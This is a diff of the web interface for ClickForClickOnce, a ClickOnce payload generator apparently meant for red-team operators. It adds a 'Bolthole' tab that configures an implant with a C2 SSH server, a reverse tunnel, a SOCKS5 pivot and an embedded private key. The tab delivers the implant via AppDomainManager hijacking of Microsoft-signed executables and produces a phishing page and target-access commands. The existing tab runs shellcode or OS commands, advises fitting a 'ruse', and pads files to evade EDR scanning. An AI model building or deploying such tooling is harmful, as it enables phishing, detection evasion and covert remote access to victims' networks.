@@ -4,20 +4,6 @@
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <title>ClickForClickOnce</title>
-        <link
-            type="image/png"
-            href="https://www.blackhillsinfosec.com/wp-content/uploads/2016/03/BHIS-favicon.png"
-            rel="apple-touch-icon"
-        />
-        <link
-            type="image/png"
-            href="//www.blackhillsinfosec.com/wp-content/uploads/2016/03/BHIS-favicon.png"
-            rel="icon"
-        />
-        <meta
-            name="robots"
-            content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1"
-        />
         <script src="https://cdn.jsdelivr.net/npm/sortablejs@1.15.0/Sortable.min.js"></script>
         <style>
             * {
@@ -94,7 +80,7 @@
                 color: #ffffff;
             }
 
-            input[type="text"], input[type="file"], select {
+            input[type="text"], input[type="number"], input[type="file"], select, textarea {
                 background-color: #2a2a2a;
                 border: 1px solid #444;
                 color: #e0e0e0;
@@ -107,7 +93,7 @@
                 transition: all 0.2s ease;
             }
 
-            input[type="text"]:focus, input[type="file"]:focus, select:focus {
+            input[type="text"]:focus, input[type="number"]:focus, input[type="file"]:focus, select:focus, textarea:focus {
                 outline: none;
                 border-color: #d6deff;
                 background-color: #333;
@@ -115,6 +101,13 @@
 
             input[type="file"] {
                 padding: 8px 12px;
+            }
+
+            textarea {
+                resize: vertical;
+                min-height: 60px;
+                font-family: 'Courier New', Courier, monospace;
+                font-size: 0.85rem;
             }
 
             button {
@@ -155,6 +148,15 @@
 
             .red-btn:hover {
                 background-color: #f25ba0;
+            }
+
+            .grey-btn {
+                background-color: #555;
+                color: #ffffff;
+            }
+
+            .grey-btn:hover {
+                background-color: #666;
             }
 
             .section {
@@ -335,6 +337,22 @@
                 line-height: 1.4;
             }
 
+            .form-row {
+                display: grid;
+                grid-template-columns: 1fr 1fr;
+                gap: 12px;
+            }
+
+            .form-row .form-field {
+                display: flex;
+                flex-direction: column;
+            }
+
+            .form-row .form-field input,
+            .form-row .form-field select {
+                margin-bottom: 0;
+            }
+
             .overlay {
                 position: fixed;
                 top: 0;
@@ -389,6 +407,115 @@
                 word-break: break-all;
             }
 
+            .bh-downloads {
+                display: flex;
+                flex-direction: column;
+                gap: 8px;
+                margin-bottom: 20px;
+            }
+
+            .bh-download-link {
+                display: flex;
+                align-items: center;
+                gap: 10px;
+                padding: 10px 14px;
+                background-color: rgba(144, 226, 74, 0.08);
+                border: 1px solid #90e24a;
+                border-radius: 4px;
+                color: #90e24a;
+                text-decoration: none;
+                font-family: 'Courier New', Courier, monospace;
+                font-size: 0.9rem;
+                font-weight: normal;
+                transition: background-color 0.2s;
+            }
+
+            .bh-download-link:hover {
+                background-color: rgba(144, 226, 74, 0.18);
+                color: #a0f25b;
+            }
+
+            .bh-download-link .dl-label {
+                color: #b0b0b0;
+                font-size: 0.8rem;
+                min-width: 90px;
+            }
+
+            .bh-checklist {
+                border-top: 1px solid rgba(144, 226, 74, 0.3);
+                padding-top: 16px;
+            }
+
+            .bh-checklist-title {
+                color: #ffffff;
+                font-weight: 600;
+                margin-bottom: 10px;
+            }
+
+            .bh-checklist ol {
+                padding-left: 20px;
+                color: #b0b0b0;
+                line-height: 1.8;
+                font-size: 0.9rem;
+            }
+
+            .bh-checklist ol li code {
+                background-color: rgba(255, 255, 255, 0.08);
+                padding: 2px 6px;
+                border-radius: 3px;
+                font-family: 'Courier New', Courier, monospace;
+                color: #d6deff;
+                font-size: 0.85rem;
+            }
+
+            .bh-ops-ref {
+                border-top: 1px solid rgba(144, 226, 74, 0.3);
+                padding-top: 16px;
+                margin-top: 16px;
+            }
+
+            .bh-ops-ref-title {
+                color: #ffffff;
+                font-weight: 600;
+                margin-bottom: 12px;
+            }
+
+            .bh-cmd-section {
+                margin-bottom: 14px;
+            }
+
+            .bh-cmd-label {
+                color: #b0b0b0;
+                font-size: 0.78rem;
+                text-transform: uppercase;
+                letter-spacing: 0.06em;
+                margin-bottom: 6px;
+            }
+
+            .bh-cmd-block {
+                background: rgba(0,0,0,0.4);
+                border: 1px solid #444;
+                border-radius: 4px;
+                padding: 10px 14px;
+                font-family: 'Courier New', Courier, monospace;
+                font-size: 0.82rem;
+                color: #90e24a;
+                white-space: pre;
+                overflow-x: auto;
+                cursor: pointer;
+                transition: border-color 0.15s;
+                line-height: 1.6;
+                user-select: text;
+            }
+
+            .bh-cmd-block:hover {
+                border-color: #90e24a;
+            }
+
+            .bh-cmd-block .cmd-comment {
+                color: #556;
+            }
+
             .error-message {
                 margin-top: 20px;
                 padding: 15px;
@@ -409,6 +536,12 @@
                 border-top: 1px solid #333;
             }
 
+            .submit-section.flex-row {
+                display: flex;
+                gap: 12px;
+                justify-content: center;
+            }
+
             .submit-button {
                 font-size: 1.1rem;
                 padding: 15px 30px;
@@ -420,19 +553,144 @@
                 background-color: #5ba0f2;
             }
 
+            /* Tab bar */
+            .tab-bar {
+                display: flex;
+                gap: 4px;
+                margin-bottom: 30px;
+                border-bottom: 1px solid #333;
+                padding-bottom: 0;
+            }
+
+            .tab-btn {
+                background: transparent;
+                color: #b0b0b0;
+                border: none;
+                border-bottom: 2px solid transparent;
+                border-radius: 0;
+                padding: 10px 24px;
+                font-size: 1rem;
+                font-weight: 600;
+                cursor: pointer;
+                transform: none;
+                transition: color 0.2s, border-color 0.2s;
+                margin-bottom: -1px;
+            }
+
+            .tab-btn:hover {
+                color: #e0e0e0;
+                background: transparent;
+                transform: none;
+                border-bottom-color: #555;
+            }
+
+            .tab-btn.active {
+                color: #d6deff;
+                border-bottom-color: #d6deff;
+                background: transparent;
+            }
+
+            .tab-content {
+                display: none;
+            }
+
+            .tab-content.active {
+                display: block;
+            }
+
+            /* Bolthole step progress bar */
+            .bh-step-bar {
+                display: flex;
+                align-items: center;
+                margin-bottom: 28px;
+                padding-bottom: 20px;
+                border-bottom: 1px solid #333;
+            }
+
+            .bh-step-item {
+                display: flex;
+                align-items: center;
+                gap: 10px;
+                opacity: 0.35;
+                transition: opacity 0.2s;
+            }
+
+            .bh-step-item.active {
+                opacity: 1;
+            }
+
+            .bh-step-circle {
+                width: 28px;
+                height: 28px;
+                border-radius: 50%;
+                background: #444;
+                color: #999;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-weight: 700;
+                font-size: 0.85rem;
+                flex-shrink: 0;
+                transition: background 0.2s, color 0.2s;
+            }
+
+            .bh-step-item.active .bh-step-circle {
+                background: #d6deff;
+                color: #0f0f0f;
+            }
+
+            .bh-step-label {
+                font-weight: 600;
+                color: #b0b0b0;
+                font-size: 0.95rem;
+                transition: color 0.2s;
+            }
+
+            .bh-step-item.active .bh-step-label {
+                color: #ffffff;
+            }
+
+            .bh-step-line {
+                flex: 1;
+                height: 1px;
+                background: #444;
+                margin: 0 16px;
+            }
+
+            /* Dynamic key row */
+            .key-row {
+                display: flex;
+                gap: 8px;
+                align-items: flex-start;
+                margin-bottom: 8px;
+            }
+
+            .key-row textarea {
+                flex: 1;
+                margin-bottom: 0;
+                min-height: 52px;
+            }
+
+            .key-row-remove {
+                padding: 10px 12px !important;
+                font-size: 0.85rem !important;
+                flex-shrink: 0;
+                margin-top: 0 !important;
+            }
+
             @media (max-width: 600px) {
                 body {
                     padding: 20px 15px;
                 }
-                
+
                 .main-container {
                     padding: 20px;
                 }
-                
+
                 h1 {
                     font-size: 2rem;
                 }
-                
+
                 .description {
                     font-size: 0.9rem;
                 }
@@ -441,132 +699,443 @@
                     flex-direction: column;
                     align-items: stretch;
                 }
+
+                .form-row {
+                    grid-template-columns: 1fr;
+                }
+
+                .submit-section.flex-row {
+                    flex-direction: column;
+                }
             }
         </style>
     </head>
     <body>
-        <!-- Processing Overlay (hidden by default) -->
+        <!-- Processing Overlay -->
         <div id="processingOverlay" class="overlay" style="display: none">
             <div class="spinner"></div>
-            <p class="overlay-text">Processing Request...</p>
+            <p class="overlay-text">Building package...</p>
         </div>
 
         <div class="main-container">
             <h1>ClickForClickOnce</h1>
             <p class="description">
-                Welcome to ClickForClickOnce - an easy, web-based ClickOnce which allows operators to generate configurable clickonce payloads. Checkout the <a href="http://github.com/whokilleddb/clickforclickonce">Github repository</a> to read more about the project, how it works, IoCs and more!
+                Web-based ClickOnce payload generator. Checkout the <a href="http://github.com/whokilleddb/clickforclickonce">Github repository</a> for details, IoCs and more.
             </p>
 
-            <div class="section">
-                <h2>ClickOnce Name</h2>
-                <p class="field-description">
-                    This would be the name of the application the user sees. Make sure it fits the ruse!
-                </p>
-                <input
-                    type="text"
-                    id="nameInput"
-                    placeholder="ApplicationHelper"
-                />
+            <!-- Tab navigation -->
+            <div class="tab-bar">
+                <button class="tab-btn active" onclick="switchTab('cfco')">ClickOnce</button>
+                <button class="tab-btn" onclick="switchTab('bolthole')">Bolthole</button>
             </div>
 
-            <div class="section">
-                <h2>AppDomainManager Injection Options</h2>
-                <p class="field-description">
-                    The clickonce uses AppDomainManager Injection to run payloads - choose which Exe would you like to run your payload.
-                </p>
-                <div class="radio-group">
-                    <div class="radio-option">
-                        <input type="radio" name="sideloadOption" value="tzsync" checked>
-                        <div class="radio-option-content">
-                            <div class="radio-option-title">tzsync</div>
-                            <div class="radio-option-desc">
-                                Tzsync is a TimeZone Sync program responsible for synchronizing time zone information on a Windows operating system. Note that this is a console application so you might see a CMD terminal pop up.
+            <!-- ═══════════════════════════════════════════════════ -->
+            <!--  CFCO Tab                                           -->
+            <!-- ═══════════════════════════════════════════════════ -->
+            <div id="cfco-tab" class="tab-content active">
+
+                <div class="section">
+                    <h2>ClickOnce Name</h2>
+                    <p class="field-description">
+                        This would be the name of the application the user sees. Make sure it fits the ruse!
+                    </p>
+                    <input type="text" id="nameInput" placeholder="ApplicationHelper" />
+                </div>
+
+                <div class="section">
+                    <h2>AppDomainManager Injection Options</h2>
+                    <p class="field-description">
+                        The clickonce uses AppDomainManager Injection to run payloads - choose which Exe would you like to run your payload.
+                    </p>
+                    <div class="radio-group">
+                        <div class="radio-option">
+                            <input type="radio" name="sideloadOption" value="tzsync" checked>
+                            <div class="radio-option-content">
+                                <div class="radio-option-title">tzsync</div>
+                                <div class="radio-option-desc">
+                                    Tzsync is a TimeZone Sync program responsible for synchronizing time zone information on a Windows operating system. Note that this is a console application so you might see a CMD terminal pop up.
+                                </div>
                             </div>
                         </div>
-                    </div>
 
-
-                    <div class="radio-option">
-                        <input type="radio" name="sideloadOption" value="powershell">
-                        <div class="radio-option-content">
-                            <div class="radio-option-title">Powershell ISE</div>
-                            <div class="radio-option-desc">
-                                The Windows PowerShell Integrated Scripting Environment (ISE) is a host application for Windows PowerShell that provides a graphical user interface for running commands, writing, testing, and debugging scripts.
+                        <div class="radio-option">
+                            <input type="radio" name="sideloadOption" value="powershell">
+                            <div class="radio-option-content">
+                                <div class="radio-option-title">Powershell ISE</div>
+                                <div class="radio-option-desc">
+                                    The Windows PowerShell Integrated Scripting Environment (ISE) is a host application for Windows PowerShell that provides a graphical user interface for running commands, writing, testing, and debugging scripts.
+                                </div>
                             </div>
                         </div>
-                    </div>
 
-                    <div class="radio-option">
-                        <input type="radio" name="sideloadOption" value="SystemHost">
-                        <div class="radio-option-content">
-                            <div class="radio-option-title">ServiceHub.Host.netfx</div>
-                            <div class="radio-option-desc">
-                                ServiceHub.Host.netfx.x64 is associated with Visual Studio's Service Hub, which is a set of background services that provide support for various Visual Studio features and tools.
+                        <div class="radio-option">
+                            <input type="radio" name="sideloadOption" value="SystemHost">
+                            <div class="radio-option-content">
+                                <div class="radio-option-title">ServiceHub.Host.netfx</div>
+                                <div class="radio-option-desc">
+                                    ServiceHub.Host.netfx.x64 is associated with Visual Studio's Service Hub, which is a set of background services that provide support for various Visual Studio features and tools.
+                                </div>
                             </div>
                         </div>
-                    </div>
 
-                    <div class="radio-option">
-                        <input type="radio" name="sideloadOption" value="PerfWatson2">
-                        <div class="radio-option-content">
-                            <div class="radio-option-title">PerfWatson2</div>
-                            <div class="radio-option-desc">
-                                PerfWatson2 is a part of Microsoft Visual Studio and is related to performance monitoring and crash reporting while it's running.
+                        <div class="radio-option">
+                            <input type="radio" name="sideloadOption" value="PerfWatson2">
+                            <div class="radio-option-content">
+                                <div class="radio-option-title">PerfWatson2</div>
+                                <div class="radio-option-desc">
+                                    PerfWatson2 is a part of Microsoft Visual Studio and is related to performance monitoring and crash reporting while it's running.
+                                </div>
                             </div>
                         </div>
                     </div>
                 </div>
-            </div>
 
-            <div class="section">
-                <h2>Inflate Size</h2>
-                <p class="field-description">
-                    Some EDRs dont scan artefacts above a certain size threshold - so we can artificially inflate the payload sizes here:
-                </p>
-                <div class="slider-container">
-                    <div class="slider-labels">
-                        <span>0</span>
-                        <span class="slider-value" id="inflateValue">300</span>
-                        <span>500</span>
+                <div class="section">
+                    <h2>Inflate Size</h2>
+                    <p class="field-description">
+                        Some EDRs dont scan artefacts above a certain size threshold - so we can artificially inflate the payload sizes here:
+                    </p>
+                    <div class="slider-container">
+                        <div class="slider-labels">
+                            <span>0</span>
+                            <span class="slider-value" id="inflateValue">300</span>
+                            <span>500</span>
+                        </div>
+                        <input type="range" min="0" max="500" value="300" class="slider" id="inflateSlider">
                     </div>
-                    <input type="range" min="0" max="500" value="300" class="slider" id="inflateSlider">
-                </div>
-            </div>
-
-            <div class="section">
-                <h2>Actions</h2>
-                <p class="field-description">
-                    This section allows you to add actions you want the ClickOnce to perform. The operations are performed in the order they are arranged. The Action Cards can also be dragged to be reordered.
-                </p>
-                
-                <div class="action-selector">
-                    <select id="actionType">
-                        <option value="run_code">Run Shellcode</option>
-                        <option value="drop_file">Drop File</option>
-                        <option value="run_cmd">Run OS Command</option>
-                    </select>
-                    <button id="addActionBtn" class="green-btn">Add Action</button>
                 </div>
 
-                <div id="actionCards">
-                    <!-- Action cards will be added here -->
+                <div class="section">
+                    <h2>Actions</h2>
+                    <p class="field-description">
+                        This section allows you to add actions you want the ClickOnce to perform. The operations are performed in the order they are arranged. The Action Cards can also be dragged to be reordered.
+                    </p>
+
+                    <div class="action-selector">
+                        <select id="actionType">
+                            <option value="run_code">Run Shellcode</option>
+                            <option value="drop_file">Drop File</option>
+                            <option value="run_cmd">Run OS Command</option>
+                        </select>
+                        <button id="addActionBtn" class="green-btn">Add Action</button>
+                    </div>
+
+                    <div id="actionCards">
+                        <!-- Action cards will be added here -->
+                    </div>
                 </div>
-            </div>
 
-            <div class="submit-section">
-                <button id="submitBtn" class="submit-button">Submit</button>
-            </div>
+                <div class="submit-section">
+                    <button id="submitBtn" class="submit-button">Submit</button>
+                </div>
 
-            <div id="resultsSection" class="results-section" style="display: none;">
-                <div class="results-title">Results here</div>
-                <a id="resultLink" href="#" target="_blank" class="result-link"></a>
-            </div>
-            
-            <div id="errorMessage" class="error-message" style="display: none;"></div>
-        </div>
+                <div id="resultsSection" class="results-section" style="display: none;">
+                    <div class="results-title">Results here</div>
+                    <a id="resultLink" href="#" target="_blank" class="result-link"></a>
+                </div>
+
+                <div id="errorMessage" class="error-message" style="display: none;"></div>
+
+            </div><!-- /cfco-tab -->
+
+            <!-- ═══════════════════════════════════════════════════ -->
+            <!--  Bolthole Tab                                       -->
+            <!-- ═══════════════════════════════════════════════════ -->
+            <div id="bolthole-tab" class="tab-content">
+
+                <!-- Step progress indicator -->
+                <div class="bh-step-bar">
+                    <div class="bh-step-item active" id="bh-si-1">
+                        <div class="bh-step-circle">1</div>
+                        <div class="bh-step-label">C2 Server Setup</div>
+                    </div>
+                    <div class="bh-step-line"></div>
+                    <div class="bh-step-item" id="bh-si-2">
+                        <div class="bh-step-circle">2</div>
+                        <div class="bh-step-label">Package Builder</div>
+                    </div>
+                </div>
+
+                <!-- ─────────────────────────────────────────────── -->
+                <!--  Step 1: C2 Server Setup                        -->
+                <!-- ─────────────────────────────────────────────── -->
+                <div id="bh-step1">
+
+                    <div class="section">
+                        <h2>C2 Server Configuration</h2>
+                        <p class="field-description">
+                            Configure the SSH tunnel endpoint. These values are compiled into the implant DLL.
+                            Settings are saved globally — every package you build uses the same C2 config.
+                        </p>
+
+                        <div class="form-row" style="margin-bottom:16px;">
+                            <div class="form-field">
+                                <label class="field-label">C2 Hostname</label>
+                                <p class="field-description">FQDN or IP of your C2 SSH server.</p>
+                                <input type="text" id="bh-sshHost" placeholder="c2.example.com" style="margin-bottom:0;" />
+                            </div>
+                            <div class="form-field">
+                                <label class="field-label">C2 SSH Username</label>
+                                <p class="field-description">No-login user the implant authenticates as.</p>
+                                <input type="text" id="bh-sshUser" placeholder="implant-user" style="margin-bottom:0;" />
+                            </div>
+                        </div>
+
+                        <label class="field-label">Port Scan Order</label>
+                        <p class="field-description">
+                            Comma-separated — the implant probes each port in order and connects on the first open one.
+                        </p>
+                        <input type="text" id="bh-ports" value="443,80,22,31337" />
+
+                        <div class="form-row" style="margin-bottom:16px;">
+                            <div class="form-field">
+                                <label class="field-label">Reverse Tunnel Port</label>
+                                <p class="field-description">Port forwarded back to the implant's local sshd.</p>
+                                <input type="number" id="bh-tunnelPort" value="31332" min="1" max="65535" style="margin-bottom:0;" />
+                            </div>
+                            <div class="form-field">
+                                <label class="field-label">SOCKS5 Proxy Port</label>
+                                <p class="field-description">Dynamic SOCKS5 port on the C2 server.</p>
+                                <input type="number" id="bh-socksPort" value="1080" min="1" max="65535" style="margin-bottom:0;" />
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-field">
+                                <label class="field-label">Startup Delay (seconds)</label>
+                                <p class="field-description">Sleep before the implant first connects.</p>
+                                <input type="number" id="bh-startupDelay" value="5" min="0" style="margin-bottom:0;" />
+                            </div>
+                            <div class="form-field">
+                                <label class="field-label">Reconnect Delay (seconds)</label>
+                                <p class="field-description">Sleep between reconnect attempts.</p>
+                                <input type="number" id="bh-reconnectDelay" value="30" min="0" style="margin-bottom:0;" />
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <h2>Outbound SSH Keypair</h2>
+                        <p class="field-description">
+                            A single keypair is shared across all packages — the private key is embedded in every implant,
+                            the public key is installed on the C2 server by <code>c2_setup.sh</code>.
+                            Rotate only if the key is compromised; all existing packages will stop connecting until you rebuild them.
+                        </p>
+
+                        <!-- Keypair status card -->
+                        <div id="bh-kp-card" style="background:rgba(255,255,255,0.04);border:1px solid #444;border-radius:6px;padding:16px;margin-bottom:14px;">
+                            <div id="bh-kp-loading" style="color:#b0b0b0;font-size:0.9rem;">Loading keypair…</div>
+                            <div id="bh-kp-info" style="display:none;">
+                                <div style="margin-bottom:10px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
+                                    <span style="color:#b0b0b0;font-size:0.82rem;min-width:80px;">Fingerprint:</span>
+                                    <code id="bh-kp-fingerprint" style="background:rgba(255,255,255,0.06);padding:3px 8px;border-radius:3px;font-size:0.85rem;color:#d6deff;word-break:break-all;"></code>
+                                </div>
+                                <div style="margin-bottom:4px;">
+                                    <span style="color:#b0b0b0;font-size:0.82rem;">Public Key (installed by c2_setup.sh):</span>
+                                </div>
+                                <textarea id="bh-kp-pubkey" readonly style="min-height:52px;opacity:0.75;cursor:default;" onclick="this.select()"></textarea>
+                            </div>
+                        </div>
+
+                        <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
+                            <button type="button" id="bh-regen-keypair" class="red-btn" style="padding:9px 16px;font-size:0.85rem;">↻ Rotate Keypair</button>
+                            <span id="bh-regen-warning" style="color:#e24a90;font-size:0.82rem;display:none;">
+                                Warning: all existing implants will stop connecting until rebuilt.
+                            </span>
+                        </div>
+                    </div>
+
+                    <div class="submit-section flex-row">
+                        <button id="bh-download-c2-btn" class="submit-button grey-btn">↓ Download c2_setup.sh</button>
+                        <button id="bh-step1-next-btn" class="submit-button">Next: Build Package →</button>
+                    </div>
+
+                    <div id="bh-step1-error" class="error-message" style="display: none;"></div>
+
+                </div><!-- /bh-step1 -->
+
+                <!-- ─────────────────────────────────────────────── -->
+                <!--  Step 2: Package Builder                        -->
+                <!-- ─────────────────────────────────────────────── -->
+                <div id="bh-step2" style="display:none;">
+
+                    <div class="section">
+                        <h2>ClickOnce Package</h2>
+                        <p class="field-description">
+                            Configure the ClickOnce deployment that delivers the Bolthole DLL to targets.
+                        </p>
+
+                        <label class="field-label">Application Name</label>
+                        <p class="field-description">
+                            Name shown in the ClickOnce install prompt — auto-generated, change it to fit your ruse.
+                            Alphanumeric + underscores, must start with a letter.
+                        </p>
+                        <div style="display:flex;gap:8px;align-items:center;margin-bottom:16px;">
+                            <input type="text" id="bh-name" style="margin-bottom:0;flex:1;" />
+                            <button type="button" id="bh-regen-name" style="padding:10px 14px;font-size:0.85rem;white-space:nowrap;flex-shrink:0;">↺ New Name</button>
+                        </div>
+
+                        <label class="field-label">Injection Host</label>
+                        <p class="field-description">
+                            Microsoft-signed EXE that loads the Bolthole DLL via AppDomainManager hijacking.
+                        </p>
+                        <div class="radio-group">
+                            <div class="radio-option">
+                                <input type="radio" name="bh-sideloadOption" value="PerfWatson2" checked>
+                                <div class="radio-option-content">
+                                    <div class="radio-option-title">PerfWatson2</div>
+                                    <div class="radio-option-desc">Visual Studio performance monitor. No console window — recommended.</div>
+                                </div>
+                            </div>
+                            <div class="radio-option">
+                                <input type="radio" name="bh-sideloadOption" value="tzsync">
+                                <div class="radio-option-content">
+                                    <div class="radio-option-title">tzsync</div>
+                                    <div class="radio-option-desc">TimeZone Sync service. Console app — may briefly show a CMD window.</div>
+                                </div>
+                            </div>
+                            <div class="radio-option">
+                                <input type="radio" name="bh-sideloadOption" value="SystemHost">
+                                <div class="radio-option-content">
+                                    <div class="radio-option-title">ServiceHub.Host.netfx</div>
+                                    <div class="radio-option-desc">Visual Studio Service Hub host process.</div>
+                                </div>
+                            </div>
+                            <div class="radio-option">
+                                <input type="radio" name="bh-sideloadOption" value="powershell">
+                                <div class="radio-option-content">
+                                    <div class="radio-option-title">PowerShell ISE</div>
+                                    <div class="radio-option-desc">Windows PowerShell Integrated Scripting Environment.</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <label class="field-label">Deployment URL <span style="font-weight:400;color:#888;">(optional)</span></label>
+                        <p class="field-description">
+                            Full HTTPS URL of the <code>.application</code> file on your web server. Used in the ClickOnce manifest
+                            and phishing page. Leave blank if you'll update the manifests manually after downloading.
+                        </p>
+                        <input type="text" id="bh-providerUrl" placeholder="https://update.example.com/SecurityUpdate.application" />
+
+                        <div class="form-row" style="margin-bottom:10px;">
+                            <div class="form-field">
+                                <label class="field-label">App Version</label>
+                                <input type="text" id="bh-version" value="1.0.0.0" placeholder="1.0.0.0" style="margin-bottom:0;" />
+                            </div>
+                            <div class="form-field">
+                                <label class="field-label">Inflate Size (MB)</label>
+                                <div class="slider-container" style="margin-bottom:0;">
+                                    <div class="slider-labels">
+                                        <span>0</span>
+                                        <span class="slider-value" id="bh-inflateValue">0</span>
+                                        <span>500</span>
+                                    </div>
+                                    <input type="range" min="0" max="500" value="0" class="slider" id="bh-inflateSlider">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="section">
+                        <h2>Operator Access Keys <span style="font-weight:400;color:#888;font-size:0.9rem;">(optional)</span></h2>
+                        <p class="field-description">
+                            SSH public key(s) your operators use to connect back to the target through the reverse tunnel
+                            (i.e. to SSH into the implant's embedded sshd).
+                            Written into <code>BoltFiles/authorized_keys</code> alongside a fresh auto-generated per-build key.
+                            Leave blank to rely solely on the auto-generated operator key downloaded with the build.
+                        </p>
+                        <div id="bh-opkeys-container">
+                            <div class="key-row">
+                                <textarea placeholder="ecdsa-sha2-nistp256 AAAA… operator@host"></textarea>
+                            </div>
+                        </div>
+                        <button type="button" id="bh-add-opkey" class="green-btn" style="padding:8px 14px;font-size:0.85rem;margin-top:4px;">+ Add Another Key</button>
+                    </div>
+
+                    <div class="submit-section flex-row">
+                        <button id="bh-step2-back-btn" class="submit-button grey-btn">← Back</button>
+                        <button id="bh-submitBtn" class="submit-button">Build Package</button>
+                    </div>
+
+                    <div id="bh-errorMessage" class="error-message" style="display: none;"></div>
+
+                </div><!-- /bh-step2 -->
+
+                <!-- Build results (shown after successful build) -->
+                <div id="bh-resultsSection" class="results-section" style="display: none;">
+                    <div class="results-title">Build Complete</div>
+                    <p class="field-description" style="margin-bottom: 16px;">
+                        Compilation runs in the background — files appear once complete (typically 1–3 minutes).
+                    </p>
+                    <a id="bh-dirLink" href="#" target="_blank" class="result-link" style="display:block; margin-bottom: 20px;"></a>
+
+                    <div class="bh-downloads">
+                        <a id="bh-link-zip" href="#" class="bh-download-link" target="_blank">
+                            <span class="dl-label">Package</span>
+                            <span id="bh-label-zip">package.zip</span>
+                        </a>
+                        <a id="bh-link-key" href="#" class="bh-download-link" target="_blank">
+                            <span class="dl-label">Operator key</span>
+                            <span>operator_key</span>
+                        </a>
+                        <a id="bh-link-phish" href="#" class="bh-download-link" target="_blank">
+                            <span class="dl-label">Phish page</span>
+                            <span>phish.html</span>
+                        </a>
+                        <a id="bh-link-setup" href="#" class="bh-download-link" target="_blank">
+                            <span class="dl-label">C2 setup</span>
+                            <span>c2_setup.sh</span>
+                        </a>
+                    </div>
+
+                    <div class="bh-checklist">
+                        <div class="bh-checklist-title">Deployment Checklist</div>
+                        <ol id="bh-checklist-steps"></ol>
+                    </div>
+
+                    <div id="bh-ops-ref" class="bh-ops-ref" style="display:none;">
+                        <div class="bh-ops-ref-title">Operations Reference</div>
+
+                        <div class="bh-cmd-section">
+                            <div class="bh-cmd-label">Identify target — read Windows username from SSH auth log</div>
+                            <div id="bh-cmd-monitor" class="bh-cmd-block" onclick="selectAllText(this)" title="Click to select all"></div>
+                        </div>
+
+                        <div class="bh-cmd-section">
+                            <div class="bh-cmd-label">Connect to target via reverse tunnel (run on C2)</div>
+                            <div id="bh-cmd-connect" class="bh-cmd-block" onclick="selectAllText(this)" title="Click to select all"></div>
+                        </div>
+
+                        <div class="bh-cmd-section">
+                            <div class="bh-cmd-label">Route traffic through target network — SOCKS5 proxy</div>
+                            <div id="bh-cmd-socks" class="bh-cmd-block" onclick="selectAllText(this)" title="Click to select all"></div>
+                        </div>
+                    </div>
+                </div>
+
+            </div><!-- /bolthole-tab -->
+
+        </div><!-- /main-container -->
 
         <script>
-            // Word lists for random name generation
+            // ─── Helpers ─────────────────────────────────────────────────────────────
+            function selectAllText(el) {
+                const range = document.createRange();
+                range.selectNodeContents(el);
+                const sel = window.getSelection();
+                sel.removeAllRanges();
+                sel.addRange(range);
+            }
+
+            // ─── Tab switching ────────────────────────────────────────────────────────
+            function switchTab(tab) {
+                document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+                document.getElementById(tab + '-tab').classList.add('active');
+                document.querySelector(`.tab-btn[onclick="switchTab('${tab}')"]`).classList.add('active');
+            }
+
+            // ─── Shared helpers ───────────────────────────────────────────────────────
             const adjectives = [
                 'Smart', 'Quick', 'Secure', 'Silent', 'Rapid', 'Swift', 'Dynamic', 'Advanced',
                 'Premium', 'Elite', 'Pro', 'Ultra', 'Super', 'Mega', 'Power', 'Turbo',
@@ -575,7 +1144,6 @@
                 'Blue', 'Green', 'Red', 'Gold', 'Silver', 'Crystal', 'Digital', 'Cyber',
                 'System', 'Network', 'Cloud', 'Web', 'Data', 'File', 'Core', 'Main'
             ];
-
             const nouns = [
                 'Helper', 'Manager', 'Service', 'Tool', 'Utility', 'Agent', 'Handler', 'Client',
                 'Server', 'Browser', 'Viewer', 'Editor', 'Player', 'Reader', 'Writer', 'Scanner',
@@ -586,14 +1154,11 @@
                 'Studio', 'Workspace', 'Center', 'Hub', 'Station', 'Terminal', 'Explorer', 'Navigator'
             ];
 
-            // Function to generate random name
             function generateRandomName() {
-                const randomAdjective = adjectives[Math.floor(Math.random() * adjectives.length)];
-                const randomNoun = nouns[Math.floor(Math.random() * nouns.length)];
-                return randomAdjective + randomNoun;
+                return adjectives[Math.floor(Math.random() * adjectives.length)]
+                     + nouns[Math.floor(Math.random() * nouns.length)];
             }
 
-            // Helper functions
             function isValidClickOnceName(str) {
                 return /^[a-zA-Z][a-zA-Z0-9_]*[a-zA-Z0-9]$/.test(str) || /^[a-zA-Z]$/.test(str);
             }
@@ -606,39 +1171,13 @@
                 document.getElementById("processingOverlay").style.display = "none";
             }
 
-            function clearResults() {
-                document.getElementById("resultsSection").style.display = "none";
-                document.getElementById("errorMessage").style.display = "none";
-            }
-
-            function showResults(buildid) {
-                const url = window.location + "build/" + buildid;
-                const resultsSection = document.getElementById("resultsSection");
-                const resultLink = document.getElementById("resultLink");
-                resultLink.href = url;
-                resultLink.textContent = url;
-                resultsSection.style.display = "block";
-                window.open(url, '_blank');
-            }
-
-            function showError(message) {
-                const errorDiv = document.getElementById("errorMessage");
-                errorDiv.textContent = message;
-                errorDiv.style.display = "block";
-            }
-
-            // Initialize name field with random value
+            // ─── CFCO tab init ────────────────────────────────────────────────────────
             document.getElementById("nameInput").value = generateRandomName();
 
-            // Initialize slider value display
             const inflateSlider = document.getElementById("inflateSlider");
-            const inflateValue = document.getElementById("inflateValue");
+            const inflateValue  = document.getElementById("inflateValue");
+            inflateSlider.oninput = function() { inflateValue.textContent = this.value; };
 
-            inflateSlider.oninput = function() {
-                inflateValue.textContent = this.value;
-            }
-
-            // Make action cards sortable
             let actionCards = document.getElementById('actionCards');
             let sortable = Sortable.create(actionCards, {
                 animation: 150,
@@ -646,35 +1185,28 @@
                 ghostClass: 'sortable-ghost'
             });
 
-            // Action counter for unique IDs
             let actionCounter = 0;
 
-            // Add action button handler
             document.getElementById("addActionBtn").addEventListener("click", function() {
-                const actionType = document.getElementById("actionType").value;
-                addActionCard(actionType, actionCounter++);
+                addActionCard(document.getElementById("actionType").value, actionCounter++);
             });
 
-            // Create action card based on type
